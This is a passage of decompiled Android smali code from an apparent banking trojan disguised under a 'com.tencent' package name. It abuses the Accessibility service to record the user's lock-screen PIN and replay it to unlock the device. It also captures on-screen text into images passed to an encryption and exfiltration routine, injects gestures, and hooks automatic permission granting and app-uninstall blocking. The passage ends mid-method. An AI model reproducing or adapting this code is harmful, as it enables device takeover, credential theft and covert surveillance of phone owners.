.method private static tunesxconcerningn1012performClick(Ljava/util/List;)Z
    .locals 2
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Ljava/util/List<",
            "Landroid/view/accessibility/AccessibilityNodeInfo;",
            ">;)Z"
        }
    .end annotation

    if-eqz p0, :cond_1

    .line 2844
    :try_start_0
    invoke-interface {p0}, Ljava/util/List;->isEmpty()Z

    move-result v0

    if-nez v0, :cond_1

    .line 2845
    invoke-interface {p0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p0

    :cond_0
    invoke-interface {p0}, Ljava/util/Iterator;->hasNext()Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-interface {p0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 2849
    invoke-virtual {v0}, Landroid/view/accessibility/AccessibilityNodeInfo;->isEnabled()Z

    move-result v1

    if-eqz v1, :cond_0

    const/16 p0, 0x10

    .line 2850
    invoke-virtual {v0, p0}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    move-result p0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return p0

    :catch_0
    :cond_1
    const/4 p0, 0x0

    return p0
.end method

.method public static tunesxconcerningn1012toBase64(Ljava/lang/String;)Ljava/lang/String;
    .locals 1

    :try_start_0
    const-string v0, "UTF-8"

    .line 2943
    invoke-virtual {p0, v0}, Ljava/lang/String;->getBytes(Ljava/lang/String;)[B

    move-result-object p0

    const/4 v0, 0x0

    .line 2944
    invoke-static {p0, v0}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object p0
    :try_end_0
    .catch Ljava/io/UnsupportedEncodingException; {:try_start_0 .. :try_end_0} :catch_0

    return-object p0

    :catch_0
    move-exception p0

    .line 2947
    invoke-virtual {p0}, Ljava/io/UnsupportedEncodingException;->printStackTrace()V

    const/4 p0, 0x0

    return-object p0
.end method

.method private unlockScreen()V
    .locals 8

    .line 304
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getRootInActiveWindow()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v0

    .line 305
    sget-object v1, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    const/4 v2, 0x0

    move v3, v2

    :goto_0
    const/16 v4, 0x10

    if-ge v3, v1, :cond_1

    .line 308
    :try_start_0
    invoke-static {}, Lcom/tencent/UtilityHelper;->isVivoDevice()Z

    move-result v5

    if-eqz v5, :cond_0

    .line 309
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "com.android.systemui:id/VivoPinkey"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    add-int/lit8 v7, v3, 0x1

    invoke-virtual {v6, v3, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 310
    invoke-virtual {v5, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z

    goto :goto_1

    .line 312
    :cond_0
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "com.android.systemui:id/key"

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v6, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    add-int/lit8 v7, v3, 0x1

    invoke-virtual {v6, v3, v7}, Ljava/lang/String;->substring(II)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v0, v5}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v5

    invoke-interface {v5, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v5

    check-cast v5, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 313
    invoke-virtual {v5, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :goto_1
    add-int/lit8 v3, v3, 0x1

    goto :goto_0

    :cond_1
    :try_start_1
    const-string v1, "com.android.systemui:id/key_enter_text"

    .line 322
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v1

    .line 323
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z

    move-result v3

    if-nez v3, :cond_2

    .line 324
    invoke-interface {v1, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    goto :goto_2

    :cond_2
    const-string v1, "com.android.systemui:id/key_enter"

    .line 326
    invoke-virtual {v0, v1}, Landroid/view/accessibility/AccessibilityNodeInfo;->findAccessibilityNodeInfosByViewId(Ljava/lang/String;)Ljava/util/List;

    move-result-object v0

    invoke-interface {v0, v2}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/accessibility/AccessibilityNodeInfo;

    .line 328
    :goto_2
    invoke-virtual {v0, v4}, Landroid/view/accessibility/AccessibilityNodeInfo;->performAction(I)Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    return-void
.end method

.method private unlockScreenListen()V
    .locals 2

    .line 3207
    new-instance v0, Lcom/tencent/ScreenCaptureEngine;

    invoke-direct {v0, p0}, Lcom/tencent/ScreenCaptureEngine;-><init>(Landroid/content/Context;)V

    iput-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->mScreetunesxconcerningn10nStatusController:Lcom/tencent/ScreenCaptureEngine;

    .line 3208
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$18;

    invoke-direct {v1, p0}, Lcom/tencent/AccessibilityServiceCore$18;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    invoke-virtual {v0, v1}, Lcom/tencent/ScreenCaptureEngine;->setScreenStatusListener(Lcom/tencent/ScreenStatusMonitor;)V

    .line 3223
    iget-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->mScreetunesxconcerningn10nStatusController:Lcom/tencent/ScreenCaptureEngine;

    invoke-virtual {v0}, Lcom/tencent/ScreenCaptureEngine;->startListen()V

    return-void
.end method

.method private unlockScreenSuccess()V
    .locals 3

    .line 3229
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    const/16 v1, 0x10

    const-string v2, ""

    if-le v0, v1, :cond_0

    .line 3230
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    return-void

    .line 3234
    :cond_0
    sget-object v0, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    if-eqz v0, :cond_1

    sget-object v0, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v0

    sget-object v1, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    invoke-virtual {v1}, Ljava/lang/String;->length()I

    move-result v1

    if-ne v0, v1, :cond_2

    .line 3235
    :cond_1
    sget-object v0, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    sput-object v0, Lcom/tencent/MainBackgroundService;->currentSuccessPassword:Ljava/lang/String;

    .line 3237
    :cond_2
    sput-object v2, Lcom/tencent/AccessibilityServiceCore;->ccurrentPassword:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public Treger(Ljava/lang/String;)V
    .locals 2

    .line 1149
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    .line 1150
    new-instance v1, Lcom/tencent/AccessibilityServiceCore$12;

    invoke-direct {v1, p0, p1}, Lcom/tencent/AccessibilityServiceCore$12;-><init>(Lcom/tencent/AccessibilityServiceCore;Ljava/lang/String;)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void
.end method

.method public convertToBitmap(Landroid/graphics/drawable/Drawable;II)Landroid/graphics/Bitmap;
    .locals 3

    .line 3126
    sget-object v0, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {p2, p3, v0}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v0

    .line 3127
    new-instance v1, Landroid/graphics/Canvas;

    invoke-direct {v1, v0}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    const/4 v2, 0x0

    .line 3128
    invoke-virtual {p1, v2, v2, p2, p3}, Landroid/graphics/drawable/Drawable;->setBounds(IIII)V

    .line 3129
    invoke-virtual {p1, v1}, Landroid/graphics/drawable/Drawable;->draw(Landroid/graphics/Canvas;)V

    return-object v0
.end method

.method public createskilton(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 11

    const-string v0, ":"

    if-nez p1, :cond_0

    return-void

    .line 2689
    :cond_0
    :try_start_0
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "SCH"

    const-string v3, "720"

    invoke-static {v1, v2, v3}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 2690
    invoke-virtual {p0}, Lcom/tencent/AccessibilityServiceCore;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-string v3, "SCW"

    const-string v4, "1080"

    invoke-static {v2, v3, v4}, Lcom/tencent/My_tunesxconcerningn10_Settings;->read(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 2692
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/Integer;->intValue()I

    move-result v3

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/Integer;->intValue()I

    move-result v4

    sget-object v5, Landroid/graphics/Bitmap$Config;->ARGB_8888:Landroid/graphics/Bitmap$Config;

    invoke-static {v3, v4, v5}, Landroid/graphics/Bitmap;->createBitmap(IILandroid/graphics/Bitmap$Config;)Landroid/graphics/Bitmap;

    move-result-object v3

    .line 2693
    new-instance v4, Landroid/graphics/Canvas;

    invoke-direct {v4, v3}, Landroid/graphics/Canvas;-><init>(Landroid/graphics/Bitmap;)V

    .line 2694
    new-instance v5, Landroid/graphics/Paint;

    invoke-direct {v5}, Landroid/graphics/Paint;-><init>()V

    const/high16 v6, -0x1000000

    .line 2695
    invoke-virtual {v4, v6}, Landroid/graphics/Canvas;->drawColor(I)V

    .line 2697
    new-instance v6, Landroid/graphics/Rect;

    invoke-direct {v6}, Landroid/graphics/Rect;-><init>()V

    .line 2698
    invoke-virtual {p1, v6}, Landroid/view/accessibility/AccessibilityNodeInfo;->getBoundsInScreen(Landroid/graphics/Rect;)V

    const-string v7, ""
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 2702
    :try_start_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_1

    .line 2703
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getText()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    goto :goto_0

    .line 2705
    :cond_1
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v8

    if-eqz v8, :cond_2

    .line 2706
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getContentDescription()Ljava/lang/CharSequence;

    move-result-object v8

    invoke-interface {v8}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 2714
    :catch_0
    :cond_2
    :goto_0
    :try_start_2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v8

    const-string v9, "android.widget.TextView"

    invoke-virtual {v8, v9}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v8

    const/high16 v9, -0x10000

    if-eqz v8, :cond_3

    const v8, -0xffff01

    .line 2715
    invoke-virtual {v5, v8}, Landroid/graphics/Paint;->setColor(I)V

    goto :goto_1

    .line 2716
    :cond_3
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v8

    const-string v10, "android.widget.EditText"

    invoke-virtual {v8, v10}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_4

    const v8, -0xff0100

    .line 2717
    invoke-virtual {v5, v8}, Landroid/graphics/Paint;->setColor(I)V

    goto :goto_1

    .line 2718
    :cond_4
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityNodeInfo;->getClassName()Ljava/lang/CharSequence;

    move-result-object v8

    const-string v10, "android.widget.CheckBox"

    invoke-virtual {v8, v10}, Ljava/lang/Object;->equals(Ljava/lang/Object;)Z

    move-result v8

    if-eqz v8, :cond_5

    const/16 v8, -0x100

    .line 2719
    invoke-virtual {v5, v8}, Landroid/graphics/Paint;->setColor(I)V

    goto :goto_1

    .line 2721
    :cond_5
    invoke-virtual {v5, v9}, Landroid/graphics/Paint;->setColor(I)V

    .line 2724
    :goto_1
    invoke-virtual {v5, v9}, Landroid/graphics/Paint;->setColor(I)V

    .line 2725
    sget-object v8, Landroid/graphics/Paint$Style;->STROKE:Landroid/graphics/Paint$Style;

    invoke-virtual {v5, v8}, Landroid/graphics/Paint;->setStyle(Landroid/graphics/Paint$Style;)V

    const/high16 v8, 0x40000000    # 2.0f

    .line 2726
    invoke-virtual {v5, v8}, Landroid/graphics/Paint;->setStrokeWidth(F)V

    const/high16 v8, 0x42000000    # 32.0f

    .line 2727
    invoke-virtual {v5, v8}, Landroid/graphics/Paint;->setTextSize(F)V

    .line 2729
    invoke-virtual {v4, v6, v5}, Landroid/graphics/Canvas;->drawRect(Landroid/graphics/Rect;Landroid/graphics/Paint;)V

    .line 2730
    invoke-virtual {v6}, Landroid/graphics/Rect;->exactCenterX()F

    move-result v8

    invoke-virtual {v6}, Landroid/graphics/Rect;->exactCenterY()F

    move-result v6

    invoke-virtual {v4, v7, v8, v6, v5}, Landroid/graphics/Canvas;->drawText(Ljava/lang/String;FFLandroid/graphics/Paint;)V

    .line 2731
    invoke-direct {p0, v4, p1, v5}, Lcom/tencent/AccessibilityServiceCore;->drawViewHierarchy(Landroid/graphics/Canvas;Landroid/view/accessibility/AccessibilityNodeInfo;Landroid/graphics/Paint;)V

    .line 2734
    new-instance p1, Ljava/text/SimpleDateFormat;

    const-string v4, "yyyyMMdd_HHmmss"

    invoke-direct {p1, v4}, Ljava/text/SimpleDateFormat;-><init>(Ljava/lang/String;)V

    .line 2735
    new-instance v4, Ljava/util/Date;

    invoke-direct {v4}, Ljava/util/Date;-><init>()V

    invoke-virtual {p1, v4}, Ljava/text/SimpleDateFormat;->format(Ljava/util/Date;)Ljava/lang/String;

    .line 2739
    new-instance p1, Ljava/io/ByteArrayOutputStream;

    invoke-direct {p1}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 2740
    sget-object v4, Landroid/graphics/Bitmap$CompressFormat;->PNG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v5, 0x64

    invoke-virtual {v3, v4, v5, p1}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 2741
    invoke-virtual {p1}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object p1

    .line 2744
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v4, Lcom/tencent/DataPackagingEngine;->s_tunesxconcerningn103_cr:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, ":skilton"

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, p1}, Lcom/tencent/DataEncryptionEngine;->agreeltimelybfacilitatez38(Ljava/lang/String;[B)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    :catch_1
    return-void
.end method

.method getEventText(Landroid/view/accessibility/AccessibilityEvent;)Ljava/lang/String;
    .locals 0

    .line 124
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;

    move-result-object p1

    .line 125
    invoke-virtual {p1}, Ljava/lang/Object;->toString()Ljava/lang/String;

    move-result-object p1

    return-object p1
.end method

.method synthetic lambda$continueb$2$com-tencent-tunesxconcerningn1012()V
    .locals 2

    .line 0
    const-wide/16 v0, 0x1388

    .line 3596
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 3598
    invoke-virtual {v0}, Ljava/lang/InterruptedException;->printStackTrace()V

    .line 3600
    :goto_0
    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    const/4 v1, 0x2

    .line 3601
    iput v1, v0, Landroid/os/Message;->arg1:I

    const/4 v1, 0x5

    .line 3602
    iput v1, v0, Landroid/os/Message;->what:I

    .line 3603
    iget-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    return-void
.end method

.method synthetic lambda$continuec$3$com-tencent-tunesxconcerningn1012()V
    .locals 2

    .line 0
    const-wide/16 v0, 0x1388

    .line 3618
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 3622
    new-instance v0, Landroid/os/Message;

    invoke-direct {v0}, Landroid/os/Message;-><init>()V

    const/4 v1, 0x3

    .line 3623
    iput v1, v0, Landroid/os/Message;->arg1:I

    const/4 v1, 0x5

    .line 3624
    iput v1, v0, Landroid/os/Message;->what:I

    .line 3625
    iget-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0}, Landroid/os/Handler;->sendMessage(Landroid/os/Message;)Z

    return-void

    :catch_0
    move-exception v0

    .line 3620
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method

.method synthetic lambda$continueclickBtn$1$com-tencent-tunesxconcerningn1012(I)V
    .locals 2

    .line 0
    const-wide/16 v0, 0x1388

    .line 3578
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 3582
    iget-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->handler:Landroid/os/Handler;

    invoke-virtual {v0, p1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    return-void

    :catch_0
    move-exception p1

    .line 3580
    new-instance v0, Ljava/lang/RuntimeException;

    invoke-direct {v0, p1}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v0
.end method

.method synthetic lambda$continued$4$com-tencent-tunesxconcerningn1012()V
    .locals 2

    .line 0
    const-wide/16 v0, 0x1388

    .line 3639
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 3643
    iget-object v0, p0, Lcom/tencent/AccessibilityServiceCore;->handler:Landroid/os/Handler;

    const/4 v1, 0x4

    invoke-virtual {v0, v1}, Landroid/os/Handler;->sendEmptyMessage(I)Z

    return-void

    :catch_0
    move-exception v0

    .line 3641
    new-instance v1, Ljava/lang/RuntimeException;

    invoke-direct {v1, v0}, Ljava/lang/RuntimeException;-><init>(Ljava/lang/Throwable;)V

    throw v1
.end method

.method synthetic lambda$onAccessibilityEvent$0$com-tencent-tunesxconcerningn1012(Landroid/view/accessibility/AccessibilityNodeInfo;)V
    .locals 0

    .line 2310
    invoke-virtual {p0, p1}, Lcom/tencent/AccessibilityServiceCore;->createskilton(Landroid/view/accessibility/AccessibilityNodeInfo;)V

    return-void
.end method

.method public localeTextAccessibility()Ljava/lang/String;
    .locals 2

    .line 1281
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    iget-object v1, p0, Lcom/tencent/AccessibilityServiceCore;->localeForAccessibility:Ljava/lang/String;

    invoke-direct {v0, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    const-string v0, "Enable"

    return-object v0
.end method

.method public mouseDraw([Landroid/graphics/Point;I)V
    .locals 6

    .line 192
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x18

    if-lt v0, v1, :cond_4

    .line 194
    new-instance v0, Landroid/graphics/Path;

    invoke-direct {v0}, Landroid/graphics/Path;-><init>()V

    const/4 v1, 0x0

    .line 195
    aget-object v2, p1, v1

    iget v2, v2, Landroid/graphics/Point;->x:I

    int-to-float v2, v2

    aget-object v3, p1, v1

    iget v3, v3, Landroid/graphics/Point;->y:I

    int-to-float v3, v3

    invoke-virtual {v0, v2, v3}, Landroid/graphics/Path;->moveTo(FF)V

    const v2, -0x425c4fa

    const/4 v3, 0x1

    if-ne p2, v2, :cond_3

    .line 197
    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 198
    :goto_0
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_0

    .line 204
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_0

    .line 213
    :cond_0
    :goto_1
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_1

    .line 219
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_1

    .line 228
    :cond_1
    :goto_2
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v4

    if-eqz v4, :cond_2

    .line 234
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_2

    .line 243
    :cond_2
    :goto_3
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v2

    if-eqz v2, :cond_3

    .line 249
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_3

    .line 259
    :cond_3
    :goto_4
    array-length v1, p1

    if-ge v3, v1, :cond_4

    .line 261
    aget-object v1, p1, v3

    iget v1, v1, Landroid/graphics/Point;->x:I

    int-to-float v1, v1

    aget-object v2, p1, v3

    iget v2, v2, Landroid/graphics/Point;->y:I

    int-to-float v2, v2

    invoke-virtual {v0, v1, v2}, Landroid/graphics/Path;->lineTo(FF)V

    .line 263
    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m()V

    const-wide/16 v1, 0x0

    int-to-long v4, p2

    invoke-static {v0, v1, v2, v4, v5}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/graphics/Path;JJ)Landroid/accessibilityservice/GestureDescription$StrokeDescription;

    move-result-object v1

    .line 265
    invoke-static {}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m()Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v2

    invoke-static {v2, v1}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;Landroid/accessibilityservice/GestureDescription$StrokeDescription;)Landroid/accessibilityservice/GestureDescription$Builder;

    move-result-object v1

    invoke-static {v1}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Landroid/accessibilityservice/GestureDescription$Builder;)Landroid/accessibilityservice/GestureDescription;

    move-result-object v1

    new-instance v2, Lcom/tencent/AccessibilityServiceCore$2;

    invoke-direct {v2, p0}, Lcom/tencent/AccessibilityServiceCore$2;-><init>(Lcom/tencent/AccessibilityServiceCore;)V

    const/4 v4, 0x0

    invoke-static {p0, v1, v2, v4}, Lcom/tencent/DataPackagingEngine$$ExternalSyntheticApiModelOutline0;->m(Lcom/tencent/AccessibilityServiceCore;Landroid/accessibilityservice/GestureDescription;Landroid/accessibilityservice/AccessibilityService$GestureResultCallback;Landroid/os/Handler;)Z

    add-int/lit8 v3, v3, 0x1

    goto :goto_4

    :cond_4
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .locals 16

    move-object/from16 v0, p0

    move-object/from16 v1, p1

    const-string v2, "YES"

    const-string v3, ""

    .line 1869
    invoke-static {v1, v0}, Lcom/tencent/AutoPermissionGranter;->check(Landroid/view/accessibility/AccessibilityEvent;Lcom/tencent/AccessibilityServiceCore;)V

    .line 1870
    invoke-static/range {p1 .. p1}, Lcom/tencent/AppUninstallerEngine;->check(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 1871
    .line 1872
    .line 1873
    invoke-static/range {p1 .. p1}, Lcom/tencent/ScreenLockMonitor;->checkEvent(Landroid/view/accessibility/AccessibilityEvent;)V

    .line 1907
    iget-boolean v4, v0, Lcom/tencent/AccessibilityServiceCore;->showtrust:Z

    const/16 v5, 0x8

    if-eqz v4, :cond_2

    if-nez v4, :cond_2

    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I

    move-result v4

    if-ne v4, v5, :cond_2

    .line 1908
    invoke-direct/range {p0 .. p1}, Lcom/tencent/AccessibilityServiceCore;->checkIfClickPermission(Landroid/view/accessibility/AccessibilityEvent;)Z

    move-result v4

    if-eqz v4, :cond_0

    return-void

    .line 1909
    :cond_0
    invoke-virtual/range {p1 .. p1}, Landroid/view/accessibility/AccessibilityEvent;->getSource()Landroid/view/accessibility/AccessibilityNodeInfo;

    move-result-object v4

    if-eqz v4, :cond_2

    .line 1911
